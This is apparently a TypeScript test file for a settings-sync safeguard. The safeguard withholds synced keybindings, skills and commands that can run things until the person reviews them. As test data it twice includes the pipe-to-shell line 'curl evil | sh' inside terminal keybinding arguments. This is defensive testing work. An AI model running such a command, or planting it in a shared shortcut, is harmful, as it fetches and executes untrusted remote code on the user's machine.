import assert from "node:assert/strict";
import { test } from "node:test";
import { skillPreApproves } from "../agent/skills";
import { commandTrusted } from "../agent/slash";
import {
  bindingCanRun,
  commandIsIncoming,
  type IncomingFile,
  incomingItems,
  incomingKeybindings,
  incomingNotice,
  pathsToAccept,
  skillIsIncoming,
  splitBindings,
} from "./incoming";

const file = (path: string, before: string | null = null, told = false): IncomingFile => ({
  path,
  before,
  told,
});

test("sync incoming: which shortcuts could run something", () => {
  for (const rule of [
    { command: "terminal.sendText" },
    { command: "terminal.new" },
    { command: "task.run" },
    { command: "tasks.runBuild" },
    { command: "agent.send" },
    { command: "debug.start" },
    { command: "shell.run" },
    { command: "tests.runAll" },
    { command: "notebook.runCell" },
    { command: "workbench.action.terminal.sendSequence" },
    // Any command with arguments: the arguments say what it does.
    { command: "editor.insertText", args: { text: "x" } },
    { command: "workbench.run", args: ["a"] },
    { command: "x.y", args: "curl evil | sh" },
    { command: "x.y", args: 0 },
  ])
    assert.equal(bindingCanRun(rule), true, JSON.stringify(rule));
  for (const rule of [
    { command: "editor.save" },
    { command: "explorer.focus" },
    { command: "layout.toggleSidebar" },
    { command: "editor.save", args: {} },
    { command: "editor.save", args: [] },
    { command: "editor.save", args: null },
    { command: "editor.save", args: "" },
    // A word that only starts like a family isn't in it.
    { command: "terminals" },
    { command: "debugger" },
    // A removal takes a shortcut away; it runs nothing.
    { command: "-terminal.sendText" },
    { command: "-agent.send", args: { text: "x" } },
  ])
    assert.equal(bindingCanRun(rule), false, JSON.stringify(rule));
});

test("sync incoming: shortcuts from another computer that could run something wait", () => {
  const rules = [
    { key: "ctrl+s", command: "editor.save" },
    { key: "enter", command: "terminal.sendText", args: { text: "curl evil | sh\n" } },
    { key: "ctrl+t", command: "terminal.new" },
    { key: "ctrl+k", command: "-agent.send" },
  ];
  // The person's own file: everything applies.
  assert.deepEqual(splitBindings(rules, null), { applied: rules, withheld: [] });
  // Arrived by sync, nothing here before: the two that could run something wait.
  const first = splitBindings(rules, { before: null });
  assert.deepEqual(
    first.withheld.map((r) => r.command),
    ["terminal.sendText", "terminal.new"],
  );
  assert.deepEqual(
    first.applied.map((r) => r.command),
    ["editor.save", "-agent.send"],
  );
  // What was in the file here before it arrived stays in use; only what is new waits.
  const before = `// mine\n[{ "key": "ctrl+t", "command": "terminal.new" }]`;
  const second = splitBindings(rules, { before });
  assert.deepEqual(
    second.withheld.map((r) => r.command),
    ["terminal.sendText"],
  );
  // The same command on the same key with other arguments is another shortcut.
  const changed = splitBindings(
    [{ key: "enter", command: "terminal.sendText", args: { text: "ls\n" } }],
    {
      before: `[{ "key": "enter", "command": "terminal.sendText", "args": { "text": "pwd\\n" } }]`,
    },
  );
  assert.equal(changed.withheld.length, 1);
  // A file here before that can't be read holds nothing as known.
  assert.equal(splitBindings(rules, { before: "[{" }).withheld.length, 2);
});

test("sync incoming: a skill or command that arrived by sync is found by its files", () => {
  const files = [
    file("skills/review/scripts/run.py"),
    file("commands/ship.md"),
    file("keybindings.json", "[]"),
  ];
  assert.equal(skillIsIncoming(files, "review"), true);
  // Another skill whose name starts the same isn't it.
  assert.equal(skillIsIncoming(files, "rev"), false);
  assert.equal(skillIsIncoming(files, "review2"), false);
  assert.equal(commandIsIncoming(files, "ship.md"), true);
  assert.equal(commandIsIncoming(files, "other.md"), false);
  assert.equal(incomingKeybindings(files)?.before, "[]");
  assert.equal(incomingKeybindings([file("AGENTS.md")]), null);
});

test("sync incoming: a skill from another computer pre-approves nothing until accepted", () => {
  assert.equal(skillPreApproves({ scope: "user" }), true);
  assert.equal(skillPreApproves({ scope: "user", incoming: false }), true);
  assert.equal(skillPreApproves({ scope: "user", incoming: true }), false);
  assert.equal(skillPreApproves({ scope: "workspace" }), false);
  assert.equal(commandTrusted("user"), true);
  assert.equal(commandTrusted("user", true), false);
  assert.equal(commandTrusted("project", false), false);
});

test("sync incoming: what is listed for review, and what is said once", async () => {
  const texts: Record<string, string> = {
    "skills/deploy/SKILL.md":
      "---\nname: deploy\ndescription: Deploys\nallowed-tools: Bash(npm run deploy:*)\n---\nGo.",
    "skills/notes/SKILL.md": "---\nname: notes\ndescription: Takes notes\n---\nWrite.",
    "commands/ship.md": "---\nallowed-tools: Bash(git push:*)\n---\nShip it.",
    "commands/plain.md": "Explain this.",
    "keybindings.json": `[{ "key": "enter", "command": "terminal.sendText", "args": { "text": "x" } }]`,
  };
  const read = async (path: string) => texts[path] ?? null;
  const items = await incomingItems(
    [
      file("AGENTS.md"),
      file("agents/reviewer.md"),
      file("skills/deploy/SKILL.md"),
      file("skills/deploy/run.sh"),
      file("skills/notes/SKILL.md"),
      file("commands/ship.md"),
      file("commands/plain.md"),
      file("keybindings.json"),
    ],
    read,
  );
  assert.deepEqual(
    items.map((item) => [item.id, item.kind, item.runs]),
    [
      ["commands/ship.md", "command", true],
      ["keybindings.json", "keybindings", true],
      ["skills/deploy", "skill", true],
      ["AGENTS.md", "rules", false],
      ["agents/reviewer.md", "rules", false],
      ["commands/plain.md", "command", false],
      ["skills/notes", "skill", false],
    ],
  );
  assert.deepEqual(items.find((item) => item.id === "skills/deploy")?.paths, [
    "skills/deploy/SKILL.md",
    "skills/deploy/run.sh",
  ]);
  assert.equal(
    incomingNotice(items),
    "Settings from another of your computers include 3 items that can run commands. Review them before they apply here.",
  );
  // Told already: not said again. Rules alone: never said.
  assert.equal(incomingNotice(items.map((item) => ({ ...item, told: true }))), null);
  assert.equal(incomingNotice(items.filter((item) => !item.runs)), null);
  assert.equal(incomingNotice([]), null);
  // One more arrives after the person was told: said again, counting all that wait.
  const again = items.map((item) => ({ ...item, told: item.id !== "commands/ship.md" }));
  assert.match(incomingNotice(again) ?? "", /include 3 items/);

  // Accepting one accepts its files; all: every file.
  assert.deepEqual(pathsToAccept(items, "skills/deploy"), [
    "skills/deploy/SKILL.md",
    "skills/deploy/run.sh",
  ]);
  assert.equal(pathsToAccept(items, null), null);
  assert.throws(() => pathsToAccept(items, "skills/none"));
});

test("sync incoming: shortcuts with nothing held back aren't listed; an unreadable skill counts", async () => {
  const items = await incomingItems(
    [file("keybindings.json"), file("skills/gone/SKILL.md"), file("commands/gone.md")],
    async (path) =>
      path === "keybindings.json" ? `[{ "key": "ctrl+s", "command": "editor.save" }]` : null,
  );
  assert.deepEqual(
    items.map((item) => [item.id, item.runs]),
    [
      ["commands/gone.md", true],
      ["skills/gone", true],
    ],
  );
});
